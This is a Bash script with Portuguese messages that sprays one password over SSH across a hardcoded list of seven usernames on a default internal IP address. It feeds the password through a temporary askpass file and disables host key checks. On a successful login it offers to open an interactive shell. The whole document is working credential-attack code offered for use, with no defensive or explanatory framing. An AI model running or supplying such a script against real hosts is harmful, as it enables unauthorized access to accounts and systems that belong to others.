#!/usr/bin/env bash

set -euo pipefail

SSH_BIN="${SSH_BIN:-/tmp/openssh-root/usr/bin/ssh}"
TARGET="${1:-10.20.20.57}"
REMOTE_CMD="${2:-whoami}"
MAX_PROMPTS="${MAX_PROMPTS:-3}"

USERS=(
  "jonasf"
  "nickj"
  "joshuaa"
  "joaos"
  "leonardz"
  "anneh"
  "dmitrip"
)

if [[ ! -x "${SSH_BIN}" ]]; then
  echo "[!] SSH nao encontrado em ${SSH_BIN}"
  echo "[i] Ajuste com: export SSH_BIN=/tmp/openssh-root/usr/bin/ssh"
  exit 1
fi

if ! command -v setsid >/dev/null 2>&1; then
  echo "[!] comando 'setsid' nao encontrado."
  echo "[i] Sem setsid o SSH_ASKPASS sem TTY pode falhar."
  exit 1
fi

read -r -s -p "Senha para testar em todos os usuarios: " PASSWORD
echo

if [[ -z "${PASSWORD}" ]]; then
  echo "[!] Senha vazia. Abortando."
  exit 1
fi

ASKPASS_FILE="/tmp/.askpass_all_users_$$.sh"
cleanup() {
  rm -f "${ASKPASS_FILE}"
}
trap cleanup EXIT

cat >"${ASKPASS_FILE}" <<EOF
#!/usr/bin/env sh
printf '%s\n' '${PASSWORD}'
EOF
chmod 700 "${ASKPASS_FILE}"

echo "[*] Alvo: ${TARGET}"
echo "[*] Comando remoto de teste: ${REMOTE_CMD}"
echo "[*] Tentativas por usuario: ${MAX_PROMPTS}"
echo

FOUND_USER=""
for user in "${USERS[@]}"; do
  echo "[*] Testando ${user}@${TARGET} ..."
  set +e
  output="$(
    DISPLAY=:0 SSH_ASKPASS="${ASKPASS_FILE}" SSH_ASKPASS_REQUIRE=force \
      setsid "${SSH_BIN}" \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts="${MAX_PROMPTS}" \
        -o ConnectTimeout=6 \
        "${user}@${TARGET}" "${REMOTE_CMD}" 2>&1
  )"
  rc=$?
  set -e

  if [[ ${rc} -eq 0 ]]; then
    echo "[+] SUCESSO: senha valida para ${user}"
    echo "[i] Saida remota:"
    echo "${output}"
    FOUND_USER="${user}"
    break
  fi

  if printf '%s' "${output}" | grep -qi "Permission denied"; then
    echo "[-] Falhou para ${user} (senha invalida)."
  else
    echo "[!] Inconclusivo para ${user} (rc=${rc})."
    echo "${output}"
  fi
  echo
done

if [[ -z "${FOUND_USER}" ]]; then
  echo "[-] Nenhum usuario autenticou com essa senha."
  exit 1
fi

echo
read -r -p "Abrir sessao interativa com ${FOUND_USER}? [s/N]: " OPEN_INTERACTIVE
if [[ "${OPEN_INTERACTIVE}" =~ ^[sS]$ ]]; then
  exec env DISPLAY=:0 SSH_ASKPASS="${ASKPASS_FILE}" SSH_ASKPASS_REQUIRE=force \
    setsid "${SSH_BIN}" -tt \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      "${FOUND_USER}@${TARGET}"
fi
